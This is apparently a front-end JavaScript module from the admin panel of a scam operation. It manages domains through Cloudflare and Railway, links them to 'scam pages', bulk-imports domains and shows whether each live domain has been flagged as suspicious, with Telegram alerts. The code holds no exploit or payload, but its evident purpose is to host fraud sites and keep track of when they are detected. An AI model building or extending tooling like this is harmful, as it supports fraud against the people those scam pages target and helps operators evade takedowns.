  <div style="margin-bottom:10px;">
    <label style="display:block;font-size:10.5px;font-weight:700;color:#94a3b8;letter-spacing:.05em;margin-bottom:5px;">LINK RAILWAY DOMAIN ID <span style="font-weight:400;color:#64748b;">(paste after adding domain manually in Railway dashboard)</span></label>
    <div style="display:flex;gap:8px;">
      <input id="dm-railway-id-input" type="text" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
        value="${esc(domain.railway_domain_id || '')}"
        style="flex:1;padding:7px 10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:8px;color:#f1f5f9;font-size:12px;font-family:monospace;"/>
      <button class="dm-btn secondary" id="dm-save-rwid-btn" style="padding:7px 12px;white-space:nowrap;">Save ID</button>
    </div>
  </div>

  <div class="dm-override-row">
    <select class="dm-override-sel" id="dm-override-sel">
      <option value="">— select status —</option>
      <option value="pending_nameservers">pending_nameservers</option>
      <option value="nameservers_active">nameservers_active</option>
      <option value="railway_linked">railway_linked</option>
      <option value="ssl_issued">ssl_issued</option>
      <option value="live">live</option>
      <option value="error">error</option>
    </select>
    <button class="dm-btn secondary" id="dm-override-btn" style="padding:7px 12px;">Apply</button>
  </div>
</div>`;

    const isLiveOrSsl = domain.status === 'live' || domain.status === 'ssl_issued';
    const quickLinks = `
<div class="dm-quick-links">
  ${isLiveOrSsl ? `<a class="dm-qlink green" href="https://${esc(domain.domain)}" target="_blank" rel="noopener">↗ Visit Site</a>` : ''}
  ${domain.cf_zone_id ? `<a class="dm-qlink orange" href="https://dash.cloudflare.com/zones/${esc(domain.cf_zone_id)}" target="_blank" rel="noopener">☁ Cloudflare</a>` : ''}
  <a class="dm-qlink blue" href="https://railway.app" target="_blank" rel="noopener">🚂 Railway</a>
</div>`;

    const flagSection = domain.flagged ? `
<div class="dm-detail-section" style="border-color:rgba(239,68,68,.3);background:rgba(239,68,68,.06);">
  <div class="dm-detail-lbl" style="color:#f87171;">⚠ Domain Flagged</div>
  <div class="dm-kv"><span class="dm-kv-k">Detected</span><span class="dm-kv-v" style="color:#f87171;">${esc(domain.flag_reason || 'Suspicious content')}</span></div>
  <div class="dm-kv"><span class="dm-kv-k">Flagged at</span><span class="dm-kv-v">${fmtTime(domain.flag_detected_at)}</span></div>
</div>` : '';

    const content = `
<div>
  ${quickLinks}
  ${flagSection}
  <!-- Status summary -->
  <div class="dm-detail-section">
    <div class="dm-detail-lbl">Status</div>
    <div class="dm-kv">
      <span class="dm-kv-k">Current status</span>
      <span class="dm-kv-v" style="color:${meta.color};font-family:sans-serif;font-weight:700;">${meta.icon} ${meta.label}</span>
    </div>
    <div class="dm-kv">
      <span class="dm-kv-k">Last checked</span>
      <span class="dm-kv-v">${fmtTime(domain.last_checked_at)}</span>
    </div>
    <div class="dm-kv">
      <span class="dm-kv-k">DNS provider</span>
      <span class="dm-kv-v">${esc(domain.dns_provider)}</span>
    </div>
    <div class="dm-kv">
      <span class="dm-kv-k">Hosting provider</span>
      <span class="dm-kv-v">${esc(domain.hosting_provider)}</span>
    </div>
    ${domain.cf_zone_id ? `<div class="dm-kv"><span class="dm-kv-k">CF Zone ID</span><span class="dm-kv-v">${esc(domain.cf_zone_id)}</span></div>` : ''}
    ${domain.railway_domain_id ? `<div class="dm-kv"><span class="dm-kv-k">Railway Domain ID</span><span class="dm-kv-v">${esc(domain.railway_domain_id)}</span></div>` : ''}
    ${domain.error_message ? `<div class="dm-kv"><span class="dm-kv-k">Error</span><span class="dm-kv-v" style="color:#f87171;">${esc(domain.error_message)}</span></div>` : ''}
    ${domain.uptime_ok !== null ? `<div class="dm-kv"><span class="dm-kv-k">Last uptime check</span><span class="dm-kv-v" style="color:${domain.uptime_ok ? '#6ee7b7' : '#f87171'}">${domain.uptime_ok ? 'Up ✓' : 'Down ✕'} · ${fmtTime(domain.last_uptime_check_at)}</span></div>` : ''}
    ${domain.manual_override ? `<div class="dm-kv"><span class="dm-kv-k">Manual override</span><span class="dm-kv-v" style="color:#fbbf24;">Yes${domain.manual_override_note ? ' — ' + esc(domain.manual_override_note) : ''}</span></div>` : ''}
  </div>
  ${nsSection}
  ${dnsSection}
  ${scamPageSection}
  ${overrideSection}
  <!-- Audit log -->
  <div class="dm-detail-section">
    <div class="dm-detail-lbl">Audit Log</div>
    <div id="dm-audit-list">${logsHtml}</div>
  </div>
</div>`;

    window.showModal({
      title: `🌐 ${esc(domain.domain)}`,
      content,
      confirmText:     null,
      cancelText:      'Close',
      width:           '600px',
      closeOnBackdrop: false,
    });

    setTimeout(() => {
      if (ns.length) wireNsCopy(document.querySelector('.alp-mb'));

      const saveWebsiteBtn = document.getElementById('dm-save-website-btn');
      saveWebsiteBtn?.addEventListener('click', async () => {
        const sel       = document.getElementById('dm-website-sel');
        const websiteId = sel?.value ? Number(sel.value) : null;
        try {
          await window.ALPApi.setDomainWebsite(id, websiteId);
          const page = _scamPages.find(w => w.id === websiteId);
          window.showToast(page ? `Linked to "${page.name}"` : 'Scam page unlinked', 'success');
          await loadAll();
          openDetail(id); // re-open with updated data
        } catch (err) {
          window.showToast(err.message, 'error');
        }
      });

      const saveRwIdBtn = document.getElementById('dm-save-rwid-btn');
      saveRwIdBtn?.addEventListener('click', async () => {
        const input = document.getElementById('dm-railway-id-input');
        const rwId  = (input?.value || '').trim();
        if (!rwId) { window.showToast('Enter a Railway domain ID', 'error'); return; }
        try {
          await window.ALPApi.setDomainRailwayId(id, rwId);
          window.showToast('Railway domain ID saved', 'success');
          await loadManaged();
          renderTable();
        } catch (err) {
          window.showToast(err.message, 'error');
        }
      });

      const overrideBtn = document.getElementById('dm-override-btn');
      overrideBtn?.addEventListener('click', async () => {
        const sel    = document.getElementById('dm-override-sel');
        const status = sel?.value;
        if (!status) return;
        try {
          await window.ALPApi.overrideDomainStatus(id, status, '');
          window.showToast(`Status overridden to ${status}`, 'success');
          await loadManaged();
          renderTable();
          renderMonitor();
        } catch (err) {
          window.showToast(err.message, 'error');
        }
      });
    }, 80);

    // Load audit log async
    try {
      const { logs } = await window.ALPApi.getDomainAudit(id);
      const listEl = document.getElementById('dm-audit-list');
      if (!listEl) return;
      if (!logs || !logs.length) {
        listEl.innerHTML = '<div style="color:var(--text-tertiary);font-size:12px;">No audit events yet.</div>';
        return;
      }
      listEl.innerHTML = logs.map(l => `
<div class="dm-audit-row">
  <span class="dm-audit-time">${fmtTime(l.created_at)}</span>
  <div>
    <span class="dm-audit-action">${esc(l.action)}</span>
    ${l.error ? `<div class="dm-audit-error">${esc(l.error)}</div>` : ''}
  </div>
</div>`).join('');
    } catch { /* audit load failure is non-critical */ }
  }

  // ─── Recheck ─────────────────────────────────────────────────────────────

  async function recheckDomain(id, btn) {
    if (btn) btn.disabled = true;
    try {
      await window.ALPApi.recheckDomain(id);
      window.showToast('Check started', 'success');
      // Poll a few times to show progress
      let polls = 0;
      const t = setInterval(async () => {
        polls++;
        await loadManaged();
        renderTable();
        if (polls >= 6) clearInterval(t);
      }, 3000);
    } catch (err) {
      window.showToast(err.message, 'error');
    } finally {
      if (btn) setTimeout(() => { btn.disabled = false; }, 5000);
    }
  }

  // ─── Delete ───────────────────────────────────────────────────────────────

  function confirmDelete(id) {
    const d = _domains.find(x => String(x.id) === String(id));
    if (!d) return;
    window.showModal({
      title: 'Delete Domain',
      type:  'danger',
      content: `<p style="margin:0;color:var(--text-secondary);font-size:13px;line-height:1.6;">
        Delete <strong style="color:#f1f5f9;">${esc(d.domain)}</strong>?<br>
        <span style="font-size:11.5px;color:var(--text-muted);">
          This will also delete the Cloudflare zone and Railway domain attachment.
          This action cannot be undone.
        </span></p>`,
      confirmText: 'Delete Everything',
      onConfirm: async () => {
        try {
          const res = await window.ALPApi.deleteManagedDomain(id);
          const notices = res && res.notices && res.notices.length ? res.notices : [];
          const msg = notices.length
            ? `${d.domain} deleted from panel. Note: ${notices.join('; ')}.`
            : `${d.domain} deleted`;
          window.showToast(msg, 'success');
          await loadAll();
        } catch (err) {
          window.showToast(err.message, 'error');
        }
      },
    });
  }

  // ─── Bulk import modal ────────────────────────────────────────────────────

  function openImportModal() {
    window.showModal({
      title: 'Bulk Import Domains',
      content: `
<div style="font-size:12.5px;color:var(--text-secondary);margin-bottom:12px;line-height:1.6;">
  Enter one domain per line (max 50). Each will have a Cloudflare zone created automatically.
</div>
<textarea id="dm-import-ta" placeholder="example.com&#10;another.io&#10;mysite.net"
  style="width:100%;height:140px;padding:10px 12px;background:rgba(255,255,255,.05);
  border:1px solid rgba(255,255,255,.1);border-radius:9px;color:#f1f5f9;
  font-size:12px;font-family:monospace;box-sizing:border-box;resize:vertical;"></textarea>
<div id="dm-import-result" style="margin-top:10px;font-size:11.5px;"></div>`,
      confirmText: 'Import',
      cancelText:  'Cancel',
      width: '480px',
      onConfirm: async () => {
        const ta  = document.getElementById('dm-import-ta');
        const raw = (ta?.value || '').split('\n').map(s => s.trim()).filter(Boolean);
        if (!raw.length) throw new Error('No domains entered');

        const { results } = await window.ALPApi.importDomains(raw);
        const ok  = results.filter(r => r.ok).length;
        const bad = results.filter(r => !r.ok);

        const resultEl = document.getElementById('dm-import-result');
        if (resultEl) {
          resultEl.innerHTML = `<span style="color:#6ee7b7;">${ok} added</span>` +
            (bad.length ? ` · <span style="color:#f87171;">${bad.length} failed</span>` : '') +
            (bad.length ? '<br>' + bad.map(r => `<span style="color:#f87171;">${esc(r.domain)}: ${esc(r.error)}</span>`).join('<br>') : '');
        }

        await loadManaged();
        renderTable();
        if (bad.length) throw new Error('keep-modal');
      },
    });
  }

  // ─── Domain Monitor ───────────────────────────────────────────────────────

  function renderMonitor() {
    const wrap = document.getElementById('dm-monitor-wrap');
    if (!wrap) return;

    if (!_domains.length) {
      wrap.innerHTML = `<div class="dm-empty" style="padding:20px;"><p>No managed domains to monitor.</p></div>`;
      return;
    }

    const rows = _domains.map(d => {
      const meta   = STATUS_META[d.status] || STATUS_META.error;
      const isLive = d.status === 'live' || d.status === 'ssl_issued';

      let uptimeHtml = `<span class="dm-uptime-dot unknown">—</span>`;
      if (d.uptime_ok === 1) uptimeHtml = `<span class="dm-uptime-dot up">↑ Up</span>`;
      if (d.uptime_ok === 0) uptimeHtml = `<span class="dm-uptime-dot down">↓ Down</span>`;

      let flagHtml;
      if (!isLive) {
        flagHtml = `<span class="dm-flag-none">—</span>`;
      } else if (d.flagged) {
        flagHtml = `<span class="dm-flag-alert" title="${esc(d.flag_reason || '')}">⚠ Flagged</span>`;
      } else {
        flagHtml = `<span class="dm-flag-clean">✓ Clean</span>`;
      }

      const visitLink = isLive
        ? `<a href="https://${esc(d.domain)}" target="_blank" rel="noopener" style="color:#6ee7b7;text-decoration:none;font-size:11px;opacity:.7;margin-left:4px;" title="Visit site">↗</a>`
        : '';

      return `<div class="dm-mon-row">
        <div class="dm-mon-domain">${esc(d.domain)}${visitLink}</div>
        <div class="dm-mon-status" style="color:${meta.color};">${meta.icon} ${meta.label}</div>
        <div class="dm-mon-flag">${flagHtml}</div>
        <div class="dm-mon-uptime">${uptimeHtml}</div>
        <div class="dm-mon-time">${fmtAgo(d.last_uptime_check_at || d.last_checked_at)}</div>
      </div>`;
    }).join('');

    const liveCount    = _domains.filter(d => d.status === 'live').length;
    const flaggedCount = _domains.filter(d => d.flagged).length;
    const downCount    = _domains.filter(d => d.uptime_ok === 0).length;

    wrap.innerHTML = `
<div style="display:flex;gap:14px;margin-bottom:10px;flex-wrap:wrap;">
  <span style="font-size:11px;color:var(--text-tertiary);">
    <strong style="color:#6ee7b7;">${liveCount}</strong> live
    ${downCount ? `· <strong style="color:#f87171;">${downCount}</strong> down` : ''}
    ${flaggedCount ? `· <strong style="color:#f87171;">⚠ ${flaggedCount} flagged</strong>` : '· <span style="color:#6ee7b7;">no flags</span>'}
    · Telegram alerts active when Telegram is configured
  </span>
</div>
<div class="dm-monitor-grid">${rows}</div>`;
  }

  // ─── Data loading ─────────────────────────────────────────────────────────

  async function loadManaged() {
    try {
      const data = await window.ALPApi.getDomains();
      _domains = Array.isArray(data?.domains) ? data.domains : [];
    } catch { _domains = []; }
  }

  async function loadLegacy() {
    try {
      const data = await window.ALPApi.getWebsites();
      _websites = Array.isArray(data) ? data : (data?.websites || []);
    } catch { _websites = []; }
    try {
      const data = await window.ALPApi.getRailwayStatus();
      _railwayCfg  = data.configured;
      _railwayDoms = data.domains || [];
    } catch {
      _railwayCfg  = false;
      _railwayDoms = [];
    }
  }

  async function loadQuota() {
    try {
      _quota = await window.ALPApi.getDomainQuota();
    } catch { _quota = null; }
  }

  async function loadScamPages() {
    try {
      const data = await window.ALPApi.getWebsites();
      const list = Array.isArray(data) ? data : (data?.websites || []);
      _scamPages = list.filter(w => w.is_active !== 0);
    } catch { _scamPages = []; }
  }

  async function loadAll() {
    await Promise.all([loadManaged(), loadLegacy(), loadQuota(), loadScamPages()]);
    if (_destroyed) return;
    renderQuotaBar();
    renderTable();
    renderMonitor();
    renderLegacy();
  }

  // ─── init / destroy ───────────────────────────────────────────────────────

  function init() {
    _destroyed = false;

    loadAll();

    document.getElementById('dm-connect-btn')?.addEventListener('click', openConnectModal);
    document.getElementById('dm-import-btn')?.addEventListener('click', openImportModal);
    document.getElementById('dm-refresh-btn')?.addEventListener('click', loadAll);

    document.getElementById('dm-checkall-btn')?.addEventListener('click', async (e) => {
      const btn = e.currentTarget;
      btn.disabled = true;
      btn.textContent = 'Checking…';
      try {
        const { queued } = await window.ALPApi.checkAllDomains();
        window.showToast(`Checking ${queued} domain${queued === 1 ? '' : 's'}…`, 'success');
        setTimeout(async () => {
          await loadManaged();
          renderTable();
          renderMonitor();
        }, 4000);
      } catch (err) {
        window.showToast(err.message, 'error');
      } finally {
        setTimeout(() => { btn.disabled = false; btn.innerHTML = '<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg> Check All Now'; }, 5000);
      }
    });

    // Live status polling every 30 s
    _pollTimer = setInterval(() => {
      if (_destroyed) return;
      loadManaged().then(renderTable).catch(() => {});
    }, 30000);
  }

  function destroy() {
    _destroyed = true;
    clearInterval(_pollTimer);
    _pollTimer = null;
  }

  async function _deleteLegacyRailway(railwayDomainId, domainName) {
    window.showModal({
      title: 'Remove from Railway',
      message: `Remove <strong>${domainName}</strong> from Railway? The domain record in your website settings will stay — only the Railway custom domain attachment is deleted.`,
      confirmText: 'Remove',
      confirmClass: 'btn-danger',
      onConfirm: async () => {
        try {
          await window.ALPApi.removeRailwayDomain(railwayDomainId);
          window.showToast(`${domainName} removed from Railway`, 'success');
          await loadLegacy();
          renderLegacy();
        } catch (err) {
          window.showToast(err.message || 'Failed to remove from Railway', 'error');
        }
      }
    });
  }

  return { render, init, destroy, _deleteLegacyRailway };
})();

window.DomainsPage = DomainsPage;
